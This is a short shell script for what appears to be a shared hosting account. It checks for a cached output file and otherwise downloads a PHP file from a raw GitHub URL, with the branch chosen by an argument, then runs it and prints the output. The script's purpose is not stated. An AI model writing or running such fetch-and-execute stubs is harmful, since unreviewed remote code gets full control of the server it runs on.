#!/bin/sh
cd /home/u791571885 && [ -f t165.done ] && tail -c 9000 t165.done && exit 0
curl -fsSL -o t165.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs165.php" && /opt/alt/php83/usr/bin/php t165.php > t165.done 2>&1; tail -c 9000 t165.done
